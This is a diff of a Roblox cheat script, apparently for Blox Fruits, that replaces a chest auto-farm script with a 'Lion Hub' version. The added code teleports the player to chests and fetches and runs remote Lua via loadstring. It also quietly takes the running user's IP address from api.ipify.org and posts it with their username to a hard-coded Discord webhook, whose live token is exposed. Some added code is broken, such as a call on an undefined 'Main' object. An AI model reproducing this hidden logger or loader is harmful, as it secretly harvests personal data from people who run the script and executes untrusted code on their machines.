@@ -1,297 +1,162 @@
--- Sea Auto Farm Script
--- Handles fruit collection, chest farming, and box collection
+loadstring(game:HttpGet("https://raw.githubusercontent.com/khoanguyen-dev1/scriptnotify/refs/heads/main/fastattack.lua"))()
 
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-local rootPart = character:WaitForChild("HumanoidRootPart")
-
--- Configuration
-local config = {
-    farmEnabled = true,
-    collectFruits = false,
-    collectChests = true,
-    collectBoxes = false,
-    teleportSpeed = 100,
-    farmRadius = math.huge, -- Farm toàn bộ server
-    autoRespawn = true,
-    chestFarmMode = true -- Chế độ farm chest chuyên dụng
-}
-
--- Storage for tracked items
-local trackedItems = {}
-local isCollecting = false
-
--- Utility Functions
-local function createTween(target, properties, duration)
-    local tweenInfo = TweenInfo.new(
-        duration or 1,
-        Enum.EasingStyle.Linear,
-        Enum.EasingDirection.InOut
-    )
-    return TweenService:Create(target, tweenInfo, properties)
+repeat wait() until game:IsLoaded()
+if game.PlaceId == 2753915549 then
+    World1 = true
+elseif game.PlaceId == 4442272183 then
+    World2 = true
+elseif game.PlaceId == 7449423635 then
+    World3 = true
 end
 
-local function teleportTo(position)
-    if not rootPart then return end
-    
-    local distance = (rootPart.Position - position).Magnitude
-    local duration = distance / config.teleportSpeed
-    
-    local tween = createTween(rootPart, {
-        CFrame = CFrame.new(position)
-    }, duration)
-    
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Lion hub - Notify",
+    Icon = "rbxassetid://123709024751036",
+    Text = "Waiting load...",
+    Duration = 5
+})
+
+function PostWebhook(Url, message)
+    local request = http_request or request or HttpPost or syn.request
+    request({
+        Url = Url,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = game:GetService("HttpService"):JSONEncode(message)
+    })
+end
+
+function AdminLoggerMsg()
+    local randomColor = math.random(0, 0xFFFFFF)
+    return {
+        ["embeds"] = {{
+            ["title"] = "**Duck Hub**",
+            ["type"] = "rich",
+            ["color"] = randomColor,
+            ["fields"] = {
+                {
+                    ["name"] = "**Username**",
+                    ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "**IP Address**",
+                    ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                    ["inline"] = false
+                },
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+        }}
+    }
+end
+
+PostWebhook("https://discord.com/api/webhooks/1358380620862197830/1igzyRnsm9u1vFzCGMhN54fJVgVl3gc6UQG4Jtk3tvcWQ7qUwKPnQXtNf4L5WaEsW6DK", AdminLoggerMsg())
+
+require(game.ReplicatedStorage.Util.CameraShaker):Stop()
+
+local function checkAndKickPlayer()
+    local player = game:GetService("Players").LocalPlayer
+    local bannedHWID = ""
+    if player.UserId == bannedHWID then
+        player:Kick("Ngu")
+    end
+end
+
+checkAndKickPlayer()
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+local HttpService = game:GetService("HttpService")
+
+-- Fluent UI
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local Window = Fluent:CreateWindow({
+    Title = "Lion Hub",
+    SubTitle = "By UwU ( Lion hub ) - khoanguyen0306#0",
+    TabWidth = 110,
+    Size = UDim2.fromOffset(480, 320),
+    Acrylic = false,
+    Theme = "Yellow",
+    MinimizeKey = Enum.KeyCode.End
+})
+
+local Tabs = {
+    Main = Window:AddTab({ Title = "Full Moon", Icon = "" }),
+}
+
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local ImageButton = Instance.new("ImageButton")
+ImageButton.Parent = ScreenGui
+ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ImageButton.BorderSizePixel = 0
+ImageButton.Position = UDim2.new(0.12, 0, 0.095, 0)
+ImageButton.Size = UDim2.new(0, 50, 0, 50)
+ImageButton.Draggable = true
+ImageButton.Image = "rbxthumb://type=GamePass&id=944258394&w=150&h=150"
+
+local UICorner = Instance.new("UICorner", ImageButton)
+UICorner.CornerRadius = UDim.new(0, 10)
+
+ImageButton.MouseButton1Down:Connect(function()
+    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.End, false, game)
+end)
+
+local function playSound()
+    local sound = Instance.new("Sound", game:GetService("CoreGui"))
+    sound.SoundId = "rbxassetid://130785805"
+    sound.Volume = 10
+    sound:Play()
+end
+
+playSound()
+
+function topos(Pos)
+    local Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+    local Speed = 350  -- Default speed
+    if Distance < 250 then
+        Speed = 350
+    elseif Distance >= 1000 then
+        Speed = 350
+    end
+
+    local tween_s = game:GetService("TweenService")
+    local info = TweenInfo.new(
+        (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude / Speed,
+        Enum.EasingStyle.Linear
+    )
+    local tween = tween_s:Create(
+        game.Players.LocalPlayer.Character.HumanoidRootPart,
+        info, 
+        {CFrame = Pos}
+    )
     tween:Play()
     tween.Completed:Wait()
 end
 
-local function findAllChests()
-    local chests = {}
-    
-    -- Tìm tất cả chest trong server
-    for _, obj in pairs(workspace:GetDescendants()) do
-        local isChest = false
-        
-        -- Kiểm tra nhiều loại chest khác nhau
-        if obj.Name:lower():find("chest") or 
-           obj.Name:lower():find("treasure") or
-           obj.Name:lower():find("box") or
-           obj.Name:lower():find("crate") or
-           obj.Name == "Chest" then
-            isChest = true
-        end
-        
-        if isChest and obj:IsA("BasePart") and obj.Parent then
-            table.insert(chests, obj)
-        end
-    end
-    
-    -- Sắp xếp theo khoảng cách gần nhất
-    table.sort(chests, function(a, b)
-        local distA = (rootPart.Position - a.Position).Magnitude
-        local distB = (rootPart.Position - b.Position).Magnitude
-        return distA < distB
-    end)
-    
-    return chests
-end
-
-local function collectItem(item)
-    if not item or not item.Parent then return false end
-    
-    print("Đang thu thập: " .. item.Name .. " tại vị trí: " .. tostring(item.Position))
-    
-    -- Try different collection methods với nhiều cách hơn
-    local success = false
-    
-    -- Method 1: Direct touch
-    if item.Touched then
-        local connection
-        connection = item.Touched:Connect(function(hit)
-            if hit.Parent == character then
-                connection:Disconnect()
-                success = true
-            end
-        end)
-        
-        -- Force touch
-        firetouchinterest(rootPart, item, 0)
-        wait(0.1)
-        firetouchinterest(rootPart, item, 1)
-        wait(0.5)
-        
-        if connection then connection:Disconnect() end
-    end
-    
-    -- Method 2: Click detector
-    local clickDetector = item:FindFirstChild("ClickDetector") or item:FindFirstChildOfClass("ClickDetector")
-    if clickDetector then
-        fireclickdetector(clickDetector)
-        success = true
-        wait(0.5)
-    end
-    
-    -- Method 3: Proximity prompt
-    local proximityPrompt = item:FindFirstChild("ProximityPrompt") or item:FindFirstChildOfClass("ProximityPrompt")
-    if proximityPrompt then
-        fireproximityprompt(proximityPrompt)
-        success = true
-        wait(0.5)
-    end
-    
-    -- Method 4: Remote events (nhiều tên remote khác nhau)
-    local function tryFireRemote(remoteName, ...)
-        local remote = ReplicatedStorage:FindFirstChild(remoteName, true)
-        if remote and remote:IsA("RemoteEvent") then
-            remote:FireServer(...)
-            return true
-        end
-        return false
-    end
-    
-    -- Thử nhiều tên remote khác nhau
-    local remoteNames = {
-        "CollectChest", "Collect", "PickupItem", "TakeChest", 
-        "OpenChest", "ClaimChest", "ChestCollect", "GetChest"
-    }
-    
-    for _, remoteName in pairs(remoteNames) do
-        if tryFireRemote(remoteName, item) then
-            success = true
-            break
-        end
-    end
-    
-    -- Method 5: Thử tìm remote trong các folder khác nhau
-    local remoteFolders = {"Remotes", "Events", "Remote", "RemoteEvents", "Game"}
-    for _, folderName in pairs(remoteFolders) do
-        local folder = ReplicatedStorage:FindFirstChild(folderName)
-        if folder then
-            for _, remoteName in pairs(remoteNames) do
-                local remote = folder:FindFirstChild(remoteName)
-                if remote and remote:IsA("RemoteEvent") then
-                    remote:FireServer(item)
-                    success = true
-                    break
-                end
-            end
-        end
-        if success then break end
-    end
-    
-    print("Thu thập " .. (success and "thành công" or "thất bại") .. ": " .. item.Name)
-    wait(0.5)
-    return success
-end
-
-local function farmAllChests()
-    while config.farmEnabled and config.chestFarmMode do
-        if not isCollecting and rootPart then
-            isCollecting = true
-            
-            print("Đang tìm kiếm tất cả chest trong server...")
-            local allChests = findAllChests()
-            
-            print("Tìm thấy " .. #allChests .. " chest trong server")
-            
-            for i, chest in pairs(allChests) do
-                if not config.farmEnabled or not config.chestFarmMode then 
-                    break 
-                end
-                
-                if chest and chest.Parent then
-                    print("Farm chest " .. i .. "/" .. #allChests .. ": " .. chest.Name)
-                    
-                    -- Teleport đến chest
-                    local success = pcall(function()
-                        teleportTo(chest.Position + Vector3.new(0, 10, 0))
-                    end)
-                    
-                    if success then
-                        wait(0.5)
-                        collectItem(chest)
-                        wait(1)
-                    else
-                        print("Không thể teleport đến chest: " .. chest.Name)
-                    end
-                else
-                    print("Chest đã biến mất: " .. tostring(chest))
-                end
-            end
-            
-            print("Hoàn thành farm tất cả chest! Chờ chest mới spawn...")
-            isCollecting = false
-            wait(10) -- Chờ chest mới spawn
-        else
-            wait(1)
-        end
-    end
-end
-
--- Auto respawn function
-local function setupAutoRespawn()
-    if not config.autoRespawn then return end
-    
-    player.CharacterRemoving:Connect(function()
-        wait(1)
-        player:LoadCharacter()
-    end)
-    
-    player.CharacterAdded:Connect(function(newCharacter)
-        character = newCharacter
-        humanoid = character:WaitForChild("Humanoid")
-        rootPart = character:WaitForChild("HumanoidRootPart")
-        
-        wait(3) -- Wait for character to fully load
-    end)
-end
-
--- GUI Creation
-local function createGUI()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "AutoFarmGUI"
-    screenGui.Parent = player:WaitForChild("PlayerGui")
-    
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 250, 0, 200)
-    frame.Position = UDim2.new(0, 10, 0, 10)
-    frame.BackgroundColor3 = Color3.new(0, 0, 0)
-    frame.BackgroundTransparency = 0.3
-    frame.BorderSizePixel = 2
-    frame.BorderColor3 = Color3.new(1, 1, 1)
-    frame.Parent = screenGui
-    
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 30)
-    title.Position = UDim2.new(0, 0, 0, 0)
-    title.Text = "Sea Auto Farm"
-    title.TextColor3 = Color3.new(1, 1, 1)
-    title.TextScaled = true
-    title.BackgroundTransparency = 1
-    title.Parent = frame
-    
-    -- Toggle buttons
-    local function createToggle(name, yPos, configKey)
-        local button = Instance.new("TextButton")
-        button.Size = UDim2.new(0.9, 0, 0, 25)
-        button.Position = UDim2.new(0.05, 0, 0, yPos)
-        button.Text = name .. ": " .. (config[configKey] and "ON" or "OFF")
-        button.TextColor3 = config[configKey] and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)
-        button.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-        button.Parent = frame
-        
-        button.MouseButton1Click:Connect(function()
-            config[configKey] = not config[configKey]
-            button.Text = name .. ": " .. (config[configKey] and "ON" or "OFF")
-            button.TextColor3 = config[configKey] and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)
-        end)
-    end
-    
-    createToggle("Farm Tất Cả Chest", 40, "chestFarmMode")
-    createToggle("Auto Farm", 70, "farmEnabled")
-    createToggle("Thu Thập Fruits", 100, "collectFruits")
-    createToggle("Thu Thập Boxes", 130, "collectBoxes")
-    createToggle("Auto Respawn", 160, "autoRespawn")
-end
-
--- Initialize
-local function initialize()
-    print("=== SEA CHEST FARM SCRIPT LOADED ===")
-    print("Chế độ: Farm tất cả chest trong server")
-    print("Tính năng: Thu thập toàn bộ chest có thể")
-    
-    setupAutoRespawn()
-    createGUI()
-    
-    -- Start chest farming loop
-    spawn(farmAllChests)
-end
-
--- Start the script
-initialize()
+Main:AddToggle("Farm Chest | Safe ",false,function(value)
+ AutoFarmChest = value
+ end)
+ 
+ _G.MagnitudeAdd = 0
+spawn(function()
+	while wait() do 
+		if AutoFarmChest then
+			for i,v in pairs(game:GetService("Workspace"):GetChildren()) do 
+				if v.Name:find("Chest") and v:IsA("BasePart") then
+					if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5000 + _G.MagnitudeAdd then
+						repeat wait()
+							if v and v.Parent then
+								topos(v.CFrame)
+							end
+						until AutoFarmChest == false or not v:IsDescendantOf(game.Workspace)
+						
+						topos(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
+						_G.MagnitudeAdd = _G.MagnitudeAdd + 1500
+						break
+					end
+				end
+			end
+		end
+	end
+end)
